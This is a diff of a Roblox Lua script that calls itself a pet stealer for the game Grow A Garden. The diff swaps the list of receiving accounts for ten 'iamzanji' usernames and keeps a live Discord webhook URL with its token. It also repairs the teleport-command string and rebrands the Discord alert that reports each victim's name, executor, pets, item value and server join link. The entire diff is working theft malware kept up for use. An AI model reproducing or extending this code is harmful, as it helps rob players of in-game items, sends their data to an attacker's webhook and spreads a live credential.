@@ -3,7 +3,7 @@
     _G.scriptExecuted = false
 
     -- Configuration
-    _G.Usernames = {"ronzz2002"}
+    _G.Usernames = {"iamzanji11", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55", "iamzanji66", "iamzanji77", "iamzanji88", "iamzanji99", "iamzanji00"}
     _G.min_value = 100000  -- Lowered from 100 million to 100k for testing
     _G.pingEveryone = "Yes"
     _G.webhook = "https://discord.com/api/webhooks/1397467480670212197/O9h7_jw18J2WlZoK9eZRj7sTyu9MYOdaFlHUdFuyXa-Vur1wEW4leEHFGaD1SrrHHGVM"
@@ -323,7 +323,7 @@
         local maxPlayers = tostring(Players.MaxPlayers or "?")
         local timeStr = os.date("%I:%M %p")
         local dateStr = os.date("%m/%d/%y")
-        local teleportCmd = string.format(game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s"), placeId, jobId)
+        local teleportCmd = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', placeId, jobId)
         local teleportDisplay = string.format('%s | %s', placeId, jobId)
         local joinUrl = string.format("https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s", placeId, jobId)
 
@@ -344,7 +344,7 @@
         local playerInfoSection = string.format("```Name: %s\nExecutor: %s\nAccount Age: %s days\nPlayers in game: %s/%s```", playerName, executor, "72", playerCount, maxPlayers)
         
         local description = string.format(
-            ":bust_in_silhouette: **Player Information**\n%s\n💰 **Total Value:**\n```%s```\n🐕 **Pets Found:**\n```%s```\n🔗 **Game Link:** [Click to join](%s)\n\n`%s`",
+            ":bust_in_silhouette: **Player Information**\n%s\n💰 **Total Value:**\n```%s```\n🐕 **Pets Found:**\n```%s```\n\n🔗 **Game Link:** [Click to join](%s)\n`%s`",
             playerInfoSection,
             totalValueStr,
             petListStr,
@@ -356,7 +356,7 @@
             ["content"] = prefix .. "```lua\n" .. teleportCmd .. "\n```",
             ["username"] = playerName,
             ["embeds"] = {{
-                ["title"] = ":dog: Grow A Garden Hit - ZANJI: PET STEALER :dog:",
+                ["title"] = "🔴 X Scripts Gag Stealer",
                 ["color"] = 15158332, -- Red color
                 ["description"] = description,
                 ["footer"] = {
